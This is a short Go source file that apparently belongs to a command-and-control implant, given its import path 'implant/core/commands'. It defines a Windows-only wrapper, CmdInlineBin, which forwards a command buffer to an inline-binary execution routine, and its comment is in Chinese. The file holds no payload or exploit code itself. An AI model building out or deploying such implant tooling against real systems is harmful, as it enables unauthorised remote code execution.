//go:build windows
// +build windows

package services

import "implant/core/commands"

// CmdInlineBin Windows版本 - 兼容一个参数的函数签名
func CmdInlineBin(cmdBuf []byte) ([]byte, error) {
	return commands.InlineBin(cmdBuf)
}
